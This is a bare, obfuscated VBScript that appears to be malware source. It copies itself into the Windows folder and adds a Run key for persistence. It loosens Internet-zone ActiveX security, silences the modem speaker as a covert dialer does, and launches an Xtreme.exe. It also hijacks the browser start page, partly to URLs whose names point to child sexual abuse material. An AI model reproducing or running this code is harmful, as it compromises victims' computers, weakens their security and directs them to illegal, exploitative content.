On Error Resume Next
Set HFFLUO1U = createobject("scripting.filesystemobject")
HQOL4K4F = HFFLUO1U.getspecialfolder(0)
P5604884 = HQOL4K4F & "\fotompg.vbs"
Set TO1FSIHV = createobject("wscript.shell")
if TO1FSIHV.regread ("HKCU\software\moon\explorerpf") <> "1" then 
HFFLUO1U.copyfile wscript.scriptfullname, P5604884
TO1FSIHV.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\explorer", "wscript.exe " & P5604884 & " %"
Q4512UMQ
TO1FSIHV.regwrite "HKCU\software\moon\explorerpf", 01,"REG_DWORD"
Set regedat = CreateObject("WScript.Shell")
regedat.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 00,"REG_DWORD"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"

TO1FSIHV.run "http://www.kogalu.com/sou/internz/enter3.htm",3,false
end if
Q4512UMQ6

Q4512UMQ2

Function Q4512UMQ()
regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.kogalu.com/sou/internz/enter3.htm"
Set regedat = CreateObject("WScript.Shell")
regedat.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 00,"REG_DWORD"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"

end function

Function Q4512UMQ2()
If (HFFLUO1U.FileExists(HQOL4K4F+"\Xtreme.exe")) Then
Set regedat = CreateObject("WScript.Shell")
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"
TO1FSIHV.run HQOL4K4F+"\Xtreme.exe",false
else
regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.kogalu.com/sou/internz/enter3.htm"
Set regedat = CreateObject("WScript.Shell")
regedat.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 00,"REG_DWORD"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"
end if
end function




sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub 



Function Q4512UMQ6()
On Error Resume Next
If (HFFLUO1U.FileExists(HQOL4K4F+"\Xtreme.exe")) Then
TO1FSIHV.regwrite "HKCU\software\moon\explorervs", 00,"REG_DWORD"
Randomize
If 1 + Int(Rnd * 3) = 2 then
regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.topnymphets.com/pics?id=omanko"
else
regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.toplittle.com/pics?id=omanko"
end if
end if
end function